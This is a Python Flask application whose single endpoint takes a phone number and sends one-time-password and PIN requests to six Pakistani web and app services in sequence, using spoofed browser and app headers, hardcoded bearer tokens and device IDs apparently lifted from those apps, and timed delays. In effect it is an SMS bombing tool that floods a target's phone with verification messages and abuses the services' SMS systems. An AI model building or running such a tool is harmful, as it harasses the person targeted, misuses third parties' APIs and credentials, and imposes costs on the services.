from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
import requests
import time
import logging

app = Flask(__name__)
CORS(app)

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/send-otp', methods=['POST'])
def send_otp():
    try:
        data = request.json
        phone_number = data.get('phone_number')
        if not phone_number:
            return jsonify({"error": "Phone number is required"}), 400

        logger.info(f"Received request to send OTP to {phone_number}")

        # Delay before the first API request
        time.sleep(4)

        # First API request
        url1 = "https://web.udhaar.pk/udhaar/dukaan/create/sendotp/"
        headers1 = {
            "Host": "web.udhaar.pk",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:96.0) Gecko/20100101 Firefox/96.0",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Origin": "https://web.udhaar.pk",
            "Referer": "https://web.udhaar.pk/SignUp",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "Content-Type": "application/json; charset=UTF-8"
        }
        payload1 = {
            "phone_number": phone_number,
            "referer": None,
            "version": "multi-business"
        }
        response1 = requests.post(url1, headers=headers1, json=payload1)
        logger.info(f"First request response: {response1.status_code} - {response1.text}")
        if response1.status_code == 429:
            return jsonify({"error": "Rate limit exceeded, please try again later"}), 429
        if not response1.ok:
            return jsonify({"error": response1.text}), response1.status_code

        # Delay between requests
        time.sleep(1)

        # Second API request
        url2 = "https://staging.cricwick.net:13002/api/send_pin"
        params2 = {
            "telco": "easypaisa",
            "phone": phone_number,
            "sub_type": "",
            "source": 2,
            "sub_source": "CricwickWeb",
            "is_bundle": 1,
            "bundle_id": 13
        }
        response2 = requests.get(url2, params=params2)
        logger.info(f"Second request response: {response2.status_code} - {response2.text}")
        if response2.status_code != 200:
            return jsonify({"error": f"Failed to send OTP to Cricwick. Status code: {response2.status_code}"}), response2.status_code

        # Delay between requests
        time.sleep(3)

        # Format the phone number for the third API request
        if phone_number.startswith('0'):
            phone_number = '92' + phone_number[1:]

        # Third API request
        url3 = "https://jazztv.pk/alpha/api_gateway/index.php/users-dbss/send-otp-wc"
        headers3 = {
            "authorization": "bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9qYXp6dHYucGtcL2FscGhhXC9hcGlfZ2F0ZXdheVwvYXV0aFwvbG9naW4iLCJpYXQiOjE3MjA3NzcwMjEsImV4cCI6MTcyMTM3NzAyMSwibmJmIjoxNzIwNzc3MDIxLCJqdGkiOiJvUlpwRnFlSkllZ0NRWU1hIiwic3ViIjo2LCJwcnYiOiI4N2UwYWYxZWY5ZmQxNTgxMmZkZWM5NzE1M2ExNGUwYjA0NzU0NmFhIn0.0EyymdeXeSGI2bI38IBr-YMvH_Stnm1v2ISQ0GVJchs",
            "content-type": "application/x-www-form-urlencoded",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/3.10.0"
        }
        data1 = {
            "other_telco": "telenor",
            "device_id": "3acc1d874d4538ef",
            "user_id": "58832432",
            "telco": "other",
            "is_jazz_user": "no",
            "mobile": phone_number,
            "type": "prepaid"
        }
        data2 = {
            "other_telco": "jazz",
            "device_id": "3acc1d874d4538ef",
            "user_id": "58832432",
            "telco": "other",
            "is_jazz_user": "yes",
            "mobile": phone_number,
            "type": "prepaid"
        }
        data3 = {
            "other_telco": "ufone",
            "device_id": "3acc1d874d4538ef",
            "user_id": "58832432",
            "telco": "other",
            "is_jazz_user": "no",
            "mobile": phone_number,
            "type": "prepaid"
        }
        data4 = {
            "other_telco": "zong",
            "device_id": "3acc1d874d4538ef",
            "user_id": "58832432",
            "telco": "other",
            "is_jazz_user": "no",
            "mobile": phone_number,
            "type": "prepaid"
        }
        responses = []
        for data in [data1, data2, data3, data4]:
            response = requests.post(url3, headers=headers3, data=data)
            logger.info(f"Third request response for {data['other_telco']}: {response.status_code} - {response.text}")
            responses.append({
                "status_code": response.status_code,
                "response": response.json()
            })

        # Delay between requests
        time.sleep(1)

        # Fourth API request
        url4 = "https://portallapp.com/api/v1/auth/generate-otp"
        payload4 = {
            "mobile_no": phone_number[-10:]  # Extract the last 10 digits for mobile_no
        }
        response4 = requests.post(url4, json=payload4)
        logger.info(f"Fourth request response: {response4.status_code} - {response4.text}")
        if not response4.ok:
            return jsonify({"error": response4.text}), response4.status_code

        responses.append({
            "status_code": response4.status_code,
            "response": response4.json()
        })

        # Delay between requests
        time.sleep(1)

        # Fifth API request
        url5 = "https://jazztv.pk/alpha/api_gateway/index.php/v2/users-dbss/sign-up-wc"
        headers5 = {
            "Authorization": "bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9qYXp6dHYucGtcL2FscGhhXC9hcGlfZ2F0ZXdheVwvaW5kZXgucGhwXC9hdXRoXC9sb2dpbiIsImlhdCI6MTcyNDY4NDA4NSwiZXhwIjoxNzI1Mjg0MDg1LCJuYmYiOjE3MjQ2ODQwODUsImp0aSI6IjFxVDl0U1NqQ3FZUDNOeVIiLCJzdWIiOjYsInBydiI6Ijg3ZTBhZjFlZjlmZDE1ODEyZmRlYzk3MTUzYTE0ZTBiMDQ3NTQ2YWEifQ.WQJtyziTZJ8CB89H2tm2V16CRu_VLrC1iBkCUqnQwqk",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "okhttp/3.10.0"
        }
        data5 = {
            "device": "android",
            "utm_medium": "",
            "from_screen": "packages1",
            "is_header_enrichment": "no",
            "phone_details": "ONEPLUS LE2121 (7.1.2) - App-Version(30125)",
            "mobile": phone_number,
            "url": "",
            "other_telco": "jazz",
            "utm_medium_fb": "",
            "utm_campaign_fb": "",
            "telco": "jazz",
            "device_id": "85c5f237104aafd1",
            "ip": "",
            "utm_source": "",
            "utm_source_fb": "",
            "utm_campaign": ""
        }
        response5 = requests.post(url5, headers=headers5, data=data5)
        logger.info(f"Fifth request response: {response5.status_code} - {response5.text}")
        if not response5.ok:
            return jsonify({"error": response5.text}), response5.status_code

        responses.append({
            "status_code": response5.status_code,
            "response": response5.json()
        })

        # Delay between requests
        time.sleep(1)

        # Sixth API request (newly added)
        url6 = "https://baseapi.oraan.com/api/users/send-otp"
        auth_token = "0147C481BF6D516739336659C7CE1FDA528FEFE691DF130C0D4731EFCA06B14DE10B3166BCF76E8BC07AA08C0A344E2924DBC282387949D72B7DB773DD7BF4A7"
        headers6 = {
            "user-agent": "Dart/2.19 (dart:io)",
            "auth_token": auth_token,
            "accept-encoding": "gzip",
        }
        data6 = {
            "phone": f"+92{phone_number[-10:]}",  # Convert to +92 format for this API
            "whatsapp": "false"
        }
        response6 = requests.post(url6, headers=headers6, data=data6)
        logger.info(f"Sixth request response: {response6.status_code} - {response6.text}")
        if not response6.ok:
            return jsonify({"error": response6.text}), response6.status_code

        responses.append({
            "status_code": response6.status_code,
            "response": response6.json()
        })

        return jsonify({"success": True, "message": "OTP requests sent successfully", "responses": responses}), 200
    except Exception as e:
        logger.error(f"An error occurred: {str(e)}")
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True)
